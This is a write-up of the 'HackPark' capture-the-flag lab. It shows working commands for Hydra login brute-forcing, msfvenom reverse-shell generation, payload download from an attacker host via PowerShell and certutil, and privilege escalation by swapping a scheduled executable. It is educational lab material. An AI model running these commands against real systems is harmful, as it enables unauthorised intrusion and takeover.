Using autorecon, we quickly determine that ports 80 and 3389 are open.

<center>

![efa067d955098e8f8ee6b381e60c64ab.png](/HackPark/_resources/efa067d955098e8f8ee6b381e60c64ab-1.png)

</center>

By either looking at the autorecon results or by running a detailed nmap scan, we obtain more details about the services running on these two ports:

<center>

![1613229ae7e2222b5f5b021d0cbd24f0.png](/HackPark/_resources/1613229ae7e2222b5f5b021d0cbd24f0-1.png)

</center>

Investigating the web server on port 80, we eventually find a login page.

<center>

![2f8d1c6ad747ce3acbfbe550f89e4caf.png](/HackPark/_resources/2f8d1c6ad747ce3acbfbe550f89e4caf-1.png)

</center>

A quick Google search tells us that the default credentials for blogengine are admin:admin; this does not work in this instance, but we make note of this for later. Right-clicking on the log in button and using Firefox's inspect tool, we can determine the request type used by the log in form.

<center>

![f03ee789746226fd3abba612238de0db.png](/HackPark/_resources/f03ee789746226fd3abba612238de0db-1.png)

</center>

Alternatively, we can send the request through BurpSuite:

<center>

![3f665a94884868f0448d14ddd7faa944.png](/HackPark/_resources/3f665a94884868f0448d14ddd7faa944-1.png)

</center>

This will be useful later, as we will need the body of the POST request.

<br>

# Exploitation

We begin by brute-forcing the login page we found during our enumeration. We make use of Hydra. A bit of Googling reverse that one possible form of Hydra attack for an http-form POST request is:

```bash
hydra -l <username> -P <password list> $ip http-form-post "<path to login form>:<http post request body>:<invalid login pattern>" -V
```

For this to work, we need a few parameters:

- `<username>`: In this case, this is just admin.
- `<password list>`: We have a few choices here. We'll make use of the usual rockyou.txt password list.
- `$ip$`: This is the IP of the target machine.
- `<http post request body>`: This is the body of the HTTP post request we found using Burp. In general, we need to replace at least one of the username or password fields in the request body with `^USER^` or `^PASS^`, respectively. Since in this case we know the username, we can just use the password string.
- `<invalid login pattern>`: This is a string which Hydra will use to identify a failed login. We can test this directly on the login page and we find that "Login Failed" is the phrase returned for a failed login attempt.

Putting this together, the final command then becomes:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.0.19 http-post-form "/Account/login.aspx:__VIEWSTATE=VCLL4AD5hj4eU3c7OwZCMFSLrZgnuwNWwqU14ymrpSECMRMEss1jMVYmVb67U%2FpsBcK4tYfVcmqrQ%2B95Jw3qZzSMDHpPIKoIenuCluq6CFcmlVtKvP9qEozi293OcTTtm4qs%2Bf2KgjvhxZRnGxbLjaieg4PILs7zGesG7KaJ0cBNnJCJ&__EVENTVALIDATION=uri6bSKQN1p12IRWrOAPflhnCzioDymlveM9EI3FTCbZDuejIqx1mmjj1frSwFIxJVP67K%2BbeYtAFGpcmnK3vS7Fnnht8ZBu1RwEyFOmtErPCc0hDk71fYe4aqxdDJL%2BzggAaduPYQgoTwhO7cB9U7vuIHO7QtDBD6hYfu5TumyNHhLp&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -V
```

<center>

![e9040c88c5d9d7bd978ab69d4fcf28ca.png](/HackPark/_resources/e9040c88c5d9d7bd978ab69d4fcf28ca-1.png)

</center>

After a short while (about 1400 attempts), we obtain the password to the admin account.

<center>

![e787b6c51985dc37e38b1ac38853b00d.png](/HackPark/_resources/e787b6c51985dc37e38b1ac38853b00d-1.png)

</center>

Now that we have access to the admin account, we want to find a vulnerability which we can exploit to gain an initial foothold. Navigating to the admin page via the sidebar and then locating the about page reveals the version of BlogEngine.

<center>

![c0b94d9a6ccaf6773f8290789f22ea26.png](/HackPark/_resources/c0b94d9a6ccaf6773f8290789f22ea26-1.png)

</center>

Searching for "Blog Engine 3.3.6" on exploit DB gives us a few options; we will use [this exploit](https://www.exploit-db.com/exploits/46353) for remote code execution. Download the exploit and open the code in Mousepad. We need to change the TcpClient IP to the attacker IP. We will listen on the indicated port (in this case, I've chosen port 9999).

<center>

![24c39b9e1c067839ba50736b1bdd57ae.png](/HackPark/_resources/24c39b9e1c067839ba50736b1bdd57ae-1.png)

</center>

Start a netcat listener on the attacking machine.

<center>

![f81b1fd29f92bd75ef391547a6f8a90e.png](/HackPark/_resources/f81b1fd29f92bd75ef391547a6f8a90e-1.png)

</center>

We will run the exploit by following the instructions given in the C# file. Look for a published post using the admin dashboard and click on it to begin editing.

<center>

![2481f63928dad8cff301cb68653c3645.png](/HackPark/_resources/2481f63928dad8cff301cb68653c3645-1.png)

</center>

In the editor, click on the folder icon to open the file manager. Then rename the C# file to `PostView.ascx` and upload it.

<center>

![54df4778576ce55f5a526059f55af926.png](/HackPark/_resources/54df4778576ce55f5a526059f55af926-1.png)

</center>

We then trigger the file by navigating to `10.10.0.19/?theme=HackPark/App_Data/files`. Going back to our netcat listener, we see that we've caught a reverse shell.

<center>

![2142b8b7632e79fef82e5eec0c0c9b33.png](/HackPark/_resources/2142b8b7632e79fef82e5eec0c0c9b33-1.png)

</center>

Since our shell is unstable, we will pivot from netcat to a meterpreter session. Start by generating a reverse shell payload with msfvenom.

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.30.43 LPORT=9999 -f exe -o hackparkshell.exe
`

We then open a web server with `python3 -m http.server` within the directory containing the reverse shell executable. Meanwhile, in our netcat session we navigate to `C:\Windows\Temp` (since we don't seem to have write permissions elsewhere) and run the following command to download the msfvenom reverse shell payload.
```powershell
powershell -command "Invoke-WebRequest -OutFile shell.exe -Uri 10.6.30.43:8000/hackparkshell.exe"
```

We can also use the following command to download files onto a Windows machine.
```powershell
certutil.exe -urlcache -f http://10.6.30.43/hackparkshell.exe shell.exe
```

In another terminal window, we open up Metasploit to set up the reverse handler. We use  ``use exploit/multi/handler`` and we set the following options:

<center>

![e18242f0bff037e0f026b24a82b01662.png](/HackPark/_resources/e18242f0bff037e0f026b24a82b01662-1.png)

</center>

Now ``run``  to start the reverse TCP handler. Back in our netcat session, we execute the shell with `shell.exe`. This will give us our meterpreter shell.

<br>

# Post-exploitation

Now that we have a stable shell, we wish to escalate privileges. Using `sysinfo` gives us some more information about the Windows machine.

<center>

![ef80725497f42f86fff2a3f0ac010f3d.png](/HackPark/_resources/ef80725497f42f86fff2a3f0ac010f3d-1.png)

</center>

The room suggests feeding the output into [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) in order to determine further exploits for privilege escalation. However, this didn't seem to work for me. Instead, we'll use WinPEAS. We download the x64 exe file [from here](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and we transfer it to the target system. Here, I switched to a Windows shell within meterpreter with `shell powershell` and used the same command we used before.

<center>

![a556bb3bcc0fd6bcf88720ab09fa4b6e.png](/HackPark/_resources/a556bb3bcc0fd6bcf88720ab09fa4b6e-1.png)

</center>

We then run winPEASx64.exe. We find some AutoLogon credentials.

<center>

![b295c359179f0979ebbdecbdd843c173.png](/HackPark/_resources/b295c359179f0979ebbdecbdd843c173-1.png)

</center>

We saw that port 3389 was open and serving a Microsoft Web Server. We can use this to connect to the machine as administrator. Open a new terminal and use the command `xfreerdp /tls-seclevel:0 /u:Administrator /p:<password> /v:10.10.0.19`.

(Note: I had issues connecting to the Windows machine via RDP; a bit of Googling suggested modifying the tls-seclevel parameter. The above parameter worked for me, although I'm not sure why.)

After RDPing into the machine, we have root access. The root flag is found on the desktop.

<center>

![e0b4da138dfc97dec15f63bb7e4141cc.png](/HackPark/_resources/e0b4da138dfc97dec15f63bb7e4141cc-1.png)

</center>

Similarly, we can navigate to Jeff's desktop to obtain his flag.

<center>

![b7a8c407998e463c4527ee3e432c1a3c.png](/HackPark/_resources/b7a8c407998e463c4527ee3e432c1a3c-1.png)

</center>

Alternatively, we can follow the intended path given in Task 4 of the room. Sifting through the winPEAS output, we eventually find an abnormal service running on the Windows machine.

<center>

![6b5ec3c6fd6524ee0e3fcd0fa2f10dae.png](/HackPark/_resources/6b5ec3c6fd6524ee0e3fcd0fa2f10dae-1.png)

</center>

It seems that something is happening with the Windows Scheduler service. We caught a glimpse of this when we RDP'd into the machine; every minute or so, a strange message pops up. Within our netcat session, we navigate to `C:\Program Files (x86)\SystemScheduler` and run `tasklist /v` to see a list of currently running tasks. We note that the file `Message.exe` seems to be sheduled.

<center>

![47cc8dde9b28889cfdc4f0f59e13b6a7.png](/HackPark/_resources/47cc8dde9b28889cfdc4f0f59e13b6a7-1.png)

</center>

Our goal is to replace this file with our msfvenom payload in order to spawn a reverse shell. We use the same command as before to generate the payload, making sure to use a different port this time.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.30.43 LPORT=9998 -f exe -o Message.exe 
```

Now repeat the steps from the previous task by setting up a Metasploit handler: Delete the old Message.exe file with `del /f Message.exe`, upload the new Message.exe payload to the target system, and wait for the task to execute. Since the system scheduler runs with admin privileges, this gives us a reverse shell with elevated privileges which we can use to access the two needed flags. Now we can navigate to the relevant folders within the meterpreter shell to find the flags.

<center>

![cf3e3caf2dcae4113c340614d619b940.png](/HackPark/_resources/cf3e3caf2dcae4113c340614d619b940-1.png)

![5388252d3f95cf1883f78afa49146da9.png](/HackPark/_resources/5388252d3f95cf1883f78afa49146da9-1.png)

</center>

To finish the room, we just need to find the original install time. This type of information can be found in the winPEAS output. The correct date and time turns out to be the same as the last time the Administrator's password was reset.

<center>

![06e783f7ae4b055418e0574d50c22ff6.png](/HackPark/_resources/06e783f7ae4b055418e0574d50c22ff6-1.png)

</center>